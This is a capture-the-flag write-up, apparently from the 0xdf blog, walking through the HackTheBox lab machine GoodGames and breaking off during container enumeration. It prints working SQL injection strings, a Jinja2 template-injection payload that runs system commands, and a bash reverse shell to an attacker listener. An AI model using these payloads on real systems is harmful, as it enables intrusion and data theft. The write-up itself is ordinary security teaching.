@@ -1,0 +1,509 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: GoodGames</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-goodgames">htb-goodgames</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#uni-ctf">uni-ctf</a> <a class="post-tag" href="/tags#vhosts">vhosts</a> <a class="post-tag" href="/tags#sqli">sqli</a> <a class="post-tag" href="/tags#sqli-bypass">sqli-bypass</a> <a class="post-tag" href="/tags#sqli-union">sqli-union</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#ssti">ssti</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#escape">escape</a> <a class="post-tag" href="/tags#docker-mount">docker-mount</a> <a class="post-tag" href="/tags#htb-bolt">htb-bolt</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-02-23T10:00:00+00:00" itemprop="datePublished">Feb 23, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/02/23/htb-goodgames.html" style="color: #e6e6e6; text-decoration: none;">HTB: GoodGames</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/goodgames-cover.webp" type="image/webp"/>
+<img alt="GoodGames" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/goodgames-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>GoodGames has some basic web vulnerabilities. First there’s a SQL injection that allows for both a login bypass and union injection to dump data. The admin’s page shows a new virtualhost, which, after authing with creds from the database, has a server-side template injection vulnerability in the name in the profile, which allows for coded execution and a shell in a docker container. From that container, I’ll find the same password reused by a user on the host, and SSH to get access. On the host, I’ll abuse the home directory that’s mounted into the container and the way Linux does file permissions and ownership to get a shell as root on the host.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/446 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/goodgames" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">GoodGames</a> <a href="https://hackthebox.com/machines/goodgames" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-goodgames.webp" type="image/webp"/> <img alt="GoodGames" class="img-av" src="/icons/box-goodgames.png"/></picture></a><br/><a href="https://hackthebox.com/machines/goodgames" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1495828181781200898">21 Feb 2022</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">21 Feb 2022</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/114053" rel="noopener" target="_blank"><img alt="TheCyberGeek" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/114053" style="display: unset"/><span class="user-text" style="display: none"> TheCyberGeek</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds only one open TCP port, HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.130
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-20 18:36 UTC
+Nmap scan report for 10.10.11.130
+Host is up (0.10s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.130
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-20 18:40 UTC
+Nmap scan report for 10.10.11.130
+Host is up (0.086s latency).
+
+PORT   STATE SERVICE  VERSION
+80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+|_http-title: GoodGames | Community and Store
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 105.33 seconds
+</span></code></pre></div></div>
+<p>The version information doesn’t betray any hints as to what OS this might be.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is about video games:</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20220220134937216.png">
+<img alt="image-20220220134937216" src="https://0xdfimages.gitlab.io/img/image-20220220134937216.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20220220134937216.png"><i>Click for full image</i></a></div>
+</div>
+<p>Most the links on the page just point back to the page itself, but there are links to “Blog” (<code class="language-plaintext highlighter-rouge">/blog</code>) and “Store” (<code class="language-plaintext highlighter-rouge">/coming-soon</code>). In the footer there’s a reference to “GoodGames.HTB”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220220135346942.webp" type="image/webp"/>
+<img alt="image-20220220135346942" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220220135346942.png"/>
+</picture>
+<p>I’ll add that to my hosts file, and try a <code class="language-plaintext highlighter-rouge">wfuzz</code> brute force on additional subdomains, but it all seems to return the same site.</p>
+<p>The “Blog” site looks similar, but none of the links actually go anywhere (not even to posts):</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20220220141857961.png">
+<img alt="image-20220220141857961" src="https://0xdfimages.gitlab.io/img/image-20220220141857961.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20220220141857961.png"><i>Click for full image</i></a></div>
+</div>
+<p>The Store link just has a coming soon message (that likely counted down to the boxes original release for the University CTF):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220220141952043.webp" type="image/webp"/>
+<img alt="image-20220220141952043" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220220141952043.png"/>
+</picture>
+<p>Putting in junk to the email box and clicking subscribe complains that it’s not a valid email:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220220142036440.webp" type="image/webp"/>
+<img alt="image-20220220142036440" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220220142036440.png"/>
+</picture>
+<p>Once I give it a valid email, the subscribe button just does nothing.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> identified the webserver as “Werkzeug/2.0.2 Python/3.9.2”. That’s from the HTTP response headers:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 20 Feb 2022 19:21:27 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Werkzeug/2.0.2 Python/3.9.2</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">10524</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+</code></pre></div></div>
+<p>It’s clear this site is running on Python 3.9.2, but not much else from there.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, with no extensions given the site is in Python:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://goodgames.htb
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.5.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://goodgames.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.5.0
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">      GET      267l      548w     9265c Got </span><span class="feroxbuster-green">200</span><span class="go"> for http://goodgames.htb/8ec386322be14334a15ff3153feb0541 (url length: 32)
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">      GET         -         -         - Wildcard response is static; auto-filtering 9265 responses; toggle this behavior by using </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">      GET      267l      548w     9265c Got </span><span class="feroxbuster-green">200</span><span class="go"> for http://goodgames.htb/aa92f00415da4b20b8b4d582f0e26ae795d6f95f76574326861468d1615078bc74f0b3c5b6d540b2b43b456a138c7972 (url length: 96)
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        4l       24w      208c http://goodgames.htb/logout =&gt; </span><span class="feroxbuster-yellow">http://goodgames.htb/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      267l      553w     9294c http://goodgames.htb/login
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      909l     2572w    44212c http://goodgames.htb/blog
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      267l      545w     9267c http://goodgames.htb/profile
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      728l     2070w    33387c http://goodgames.htb/signup
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      730l     2069w    32744c http://goodgames.htb/forgot-password
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      278c http://goodgames.htb/server-status
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      287l      620w    10524c http://goodgames.htb/coming-soon
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      267l      553w     9294c http://goodgames.htb/password-reset
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m     29999/29999   0s      </span><span class="feroxbuster-green">found</span><span class="go">:11      </span><span class="feroxbuster-red">errors</span><span class="go">:2      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30001/29999   324/s   http://goodgames.htb 
+</span></code></pre></div></div>
+<p>There’s a few new paths in there having to do with account creation.</p>
+<h4 id="creating-account">Creating Account</h4>
+<p>I actually missed it on initial enumeration, but there’s a little user icon at the top right of the page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220220142850062.webp" type="image/webp"/>
+<img alt="image-20220220142850062" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220220142850062.png"/>
+</picture>
+<p>Clicking on it pops a sign-in box:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220220142914483.webp" type="image/webp"/>
+<img alt="image-20220220142914483" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220220142914483.png"/>
+</picture>
+<p>The “Sign up” link opens a new page, <code class="language-plaintext highlighter-rouge">/signup</code>:</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20220220145026893.png">
+<img alt="image-20220220145026893" src="https://0xdfimages.gitlab.io/img/image-20220220145026893.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20220220145026893.png"><i>Click for full image</i></a></div>
+</div>
+<p>On creating an account, it then allows me to sign in. The first page shows success:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220220145236642.webp" type="image/webp"/>
+<img alt="image-20220220145236642" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220220145236642.png"/>
+</picture>
+<p>After five seconds, it redirects to <code class="language-plaintext highlighter-rouge">/profile</code> (due to this HTML header, <code class="language-plaintext highlighter-rouge">&lt;meta http-equiv="refresh" content="5; url=/profile" /&gt;</code>):</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20220220145321397.png">
+<img alt="image-20220220145321397" src="https://0xdfimages.gitlab.io/img/image-20220220145321397.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20220220145321397.png"><i>Click for full image</i></a></div>
+</div>
+<p>The “Edit Details” form doesn’t seem to work, as whatever I put in returns HTTP 500, server error.</p>
+<h2 id="shell-as-root-in-container">Shell as root in Container</h2>
+<h3 id="sql-injection">SQL Injection</h3>
+<h4 id="get-request">Get Request</h4>
+<p>Despite being able to log in, it’s worth checking the login form for SQL injection. The client-side JavaScript requires a valid email address to submit. But that doesn’t stop me from intercepting that request in Burp. I’ll right click and select “Send to Repeater”:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220220151750259.png"><img alt="image-20220220151750259" src="https://0xdfimages.gitlab.io/img/image-20220220151750259.png"/><em>Click for full size image</em></a></p>
+<p>When I successfully log in, there’s a 200 response, with a cookie set, and the title “Login Success”:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220220151923944.png"><img alt="image-20220220151923944" src="https://0xdfimages.gitlab.io/img/image-20220220151923944.png"/><em>Click for full size image</em></a></p>
+<p>Further down the page, it says “Welcome 0xdf”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220220152042333.webp" type="image/webp"/>
+<img alt="image-20220220152042333" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220220152042333.png"/>
+</picture>
+<h4 id="bypass">Bypass</h4>
+<p>I’ll try changing the user to a simple SQL injection, and it works:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220220152114053.png"><img alt="image-20220220152114053" src="https://0xdfimages.gitlab.io/img/image-20220220152114053.png"/><em>Click for full size image</em></a></p>
+<p>It is worth noting that submitting <code class="language-plaintext highlighter-rouge">email=' or 1=1-- -;</code> will not work. I think this is because of how Python handles MySQL queries, specifically from <a href="https://realpython.com/python-mysql/#creating-a-new-database">Real Python</a>:</p>
+<blockquote>
+<p><strong>Note:</strong> In MySQL, it’s mandatory to put a semicolon (<code class="language-plaintext highlighter-rouge">;</code>) at the end of a statement, which denotes the termination of a query. However, MySQL Connector/Python automatically appends a semicolon at the end of your queries, so there’s no need to use it in your Python code.</p>
+</blockquote>
+<p>I’ll intercept the login, replace the username with the SQL payload, and after five seconds, I’m redirected to <code class="language-plaintext highlighter-rouge">/profile</code> for Admin:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221214518440.webp" type="image/webp"/>
+<img alt="image-20220221214518440" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221214518440.png"/>
+</picture>
+<h4 id="dump-data">Dump Data</h4>
+<p>On the page that shows before it redirects, it’s worth noting the welcome message:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220220152440168.webp" type="image/webp"/>
+<img alt="image-20220220152440168" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220220152440168.png"/>
+</picture>
+<p>Because my query selects all users, it seems to have just jammed them together. Because a column is being displayed back to me, I can likely UNION inject this to dump the full DB.</p>
+<p>If I change the username in Burp Repeater to a union injection payload, I’ll guess at the number of fields until I find that four works. On submitting  <code class="language-plaintext highlighter-rouge">' union select 1,2,3,4-- -</code>, it says “Welcome 4”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221220550131.webp" type="image/webp"/>
+<img alt="image-20220221220550131" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221220550131.png"/>
+</picture>
+<p>I can get the current database, “main”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221220828012.webp" type="image/webp"/>
+<img alt="image-20220221220828012" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221220828012.png"/>
+</picture>
+<p>There’s only two databases “main” and “information_schema”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221220955820.webp" type="image/webp"/>
+<img alt="image-20220221220955820" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221220955820.png"/>
+</picture>
+<p>“main” has three tables:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221221220282.webp" type="image/webp"/>
+<img alt="image-20220221221220282" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221221220282.png"/>
+</picture>
+<p>“user” seems the most interesting. It has four columns:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221221320248.webp" type="image/webp"/>
+<img alt="image-20220221221320248" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221221320248.png"/>
+</picture>
+<p>There’s two users in the DB:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221221616025.webp" type="image/webp"/>
+<img alt="image-20220221221616025" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221221616025.png"/>
+</picture>
+<h4 id="crack-password">Crack Password</h4>
+<p>A quick Google for the hash for admin shows it breaks to the password “superadministrator”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221221832256.webp" type="image/webp"/>
+<img alt="image-20220221221832256" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221221832256.png"/>
+</picture>
+<h3 id="ssti">SSTI</h3>
+<h4 id="enumeration--access">Enumeration / Access</h4>
+<p>At the top right of the admin’s page, there’s an extra gear icon. It’s a link to <code class="language-plaintext highlighter-rouge">http://internal-administration.goodgames.htb/login</code>. I’ll add that to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and the visit the page. It’s a login form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221220325920.webp" type="image/webp"/>
+<img alt="image-20220221220325920" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221220325920.png"/>
+</picture>
+<p>The username “admin” with password “superadministrator” works to get in. The site presents a dashboard:</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20220221221942949.png">
+<img alt="image-20220221221942949" src="https://0xdfimages.gitlab.io/img/image-20220221221942949.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20220221221942949.png"><i>Click for full image</i></a></div>
+</div>
+<p>There’s a bunch of functionality on the site that doesn’t do anything. But profile page is interesting. I can update the admin’s name to whatever I want:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221222119983.webp" type="image/webp"/>
+<img alt="image-20220221222119983" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221222119983.png"/>
+</picture>
+<h4 id="tech-stack-1">Tech Stack</h4>
+<p>The headers on this site are the same, still Python:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 23 Feb 2022 12:01:51 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Werkzeug/2.0.2 Python/3.6.7</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Cookie,Accept-Encoding</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiYjJlZjM2ZmY1MmYyMTViYTE3MWExY2EwZDJhYWE3MjJkNDc4NmVkYyJ9.YhYiLw.SY2uUMb7cHAxWkDC_CqKdW3Td0s; HttpOnly; Path=/</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">13603</span>
+</code></pre></div></div>
+<h4 id="poc">POC</h4>
+<p>Given the webserver is Python, server-side template injection (SSTI) is a common flaw to look for. To check for SSTI, I’ll give the standard payload, <code class="language-plaintext highlighter-rouge">{{ 7 * 7 }}</code>. The name updates to 49:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221222257539.webp" type="image/webp"/>
+<img alt="image-20220221222257539" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221222257539.png"/>
+</picture>
+<p>That’s an excellent sign that the site is vulnerable to SSTI.</p>
+<h4 id="execution-poc">Execution POC</h4>
+<p>Just like in the recently retired box <a href="/2022/02/19/htb-bolt.html#ssti">Bolt</a>, I can try a simple payload to see if I can get system execution via this SSTI:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="n">namespace</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
+</code></pre></div></div>
+<p>On submitting that as the name, the result returns:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220221222444916.webp" type="image/webp"/>
+<img alt="image-20220221222444916" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220221222444916.png"/>
+</picture>
+<p>Not only is that execution, but as root!</p>
+<h4 id="shell">Shell</h4>
+<p>I’ll use the same payload to get a reverse shell:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="n">namespace</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">bash -c </span><span class="sh">"</span><span class="s">bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1</span><span class="sh">"'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
+</code></pre></div></div>
+<p>On submitting, it hangs, but there’s a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.130 45016
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@3a453ab39d3d:/backend#</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll use the <code class="language-plaintext highlighter-rouge">script</code> trick to get a better shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:/backend#</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash            
+Script started, file is /dev/null
+</span><span class="gp">root@3a453ab39d3d:/backend#</span><span class="w"> </span>^Z                 
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">root@3a453ab39d3d:/backend#</span><span class="w">
+</span></code></pre></div></div>
+<p>There’s also a single user with <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">e897d18e************************
+</span></code></pre></div></div>
+<h2 id="shell-as-augustus-on-goodgames">Shell as augustus on GoodGames</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="container">Container</h4>
+<p>It’s pretty clear that I’m in a Docker container. For one, I’m already root, but just found <code class="language-plaintext highlighter-rouge">user.txt</code>. The <code class="language-plaintext highlighter-rouge">ifconfig</code> shows an IP of 172.19.0.2 on eth0.</p>
+<p>There’s a <code class="language-plaintext highlighter-rouge">.dockerenv</code> file in the filesystem root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:~#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-a</span> /
+<span class="go">.   .dockerenv  bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+..  backend     boot  etc  lib   media  opt  root  sbin  sys  usr
+</span></code></pre></div></div>
+<p>There are some more subtle things as well. The permissions on files in <code class="language-plaintext highlighter-rouge">/home/augustus</code> are showing user ids instead of names:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 24
+drwxr-xr-x 2 1000 1000 4096 Dec  2 23:51 .
+drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
+lrwxrwxrwx 1 root root    9 Nov  3 10:16 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 1000 1000  220 Oct 19 11:16 .bash_logout
+-rw-r--r-- 1 1000 1000 3526 Oct 19 11:16 .bashrc
+-rw-r--r-- 1 1000 1000  807 Oct 19 11:16 .profile
+-rw-r----- 1 root 1000   33 Feb 22 02:41 user.txt
+</span></code></pre></div></div>
+<p>There is no user augustus or user 1000 in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:~#</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>1000
+<span class="gp">root@3a453ab39d3d:~#</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>augustus
+</code></pre></div></div>
+<p>That’s an indication that this home directory is mounted into the container from the host. <code class="language-plaintext highlighter-rouge">mount</code> confirms that:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:~#</span><span class="w"> </span>mount | <span class="nb">grep </span>augustus
+<span class="go">/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
